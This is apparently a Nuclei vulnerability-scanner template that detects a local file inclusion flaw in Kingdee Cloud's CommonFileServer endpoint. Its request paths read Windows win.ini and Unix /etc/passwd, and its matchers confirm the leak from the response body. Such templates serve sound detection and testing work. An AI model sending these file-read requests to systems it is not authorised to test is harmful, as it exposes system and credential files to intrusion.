id: kingdee-cloud-CommonFileserver-fileread

info:
  name: Kingdee Cloud - Local File Inclusion
  author: Co5mos
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/CommonFileServer/c:/Windows/win.ini"
      - "{{BaseURL}}/CommonFileServer/etc/passwd"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and

      - type: regex
        part: body
        regex:
          - "root:.*:0:0"
